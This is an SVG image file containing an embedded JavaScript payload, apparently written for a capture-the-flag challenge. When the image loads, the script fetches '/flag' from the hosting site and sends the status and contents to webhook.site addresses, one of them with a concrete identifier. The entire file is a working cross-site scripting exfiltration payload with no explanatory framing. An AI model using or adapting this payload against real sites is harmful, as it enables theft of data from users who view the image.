<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://webhook.site/YOUR-ID?step=loaded');

    fetch('/flag')
      .then(r => {
        fetch('https://webhook.site/YOUR-ID?step=flag-status-' + r.status);
        return r.text();
      })
      .then(f => {
        fetch('https://webhook.site/f6c3e79a-49e9-40c2-83bd-58943012dab8?flag=' + encodeURIComponent(f));
      });
  </script>
</svg>
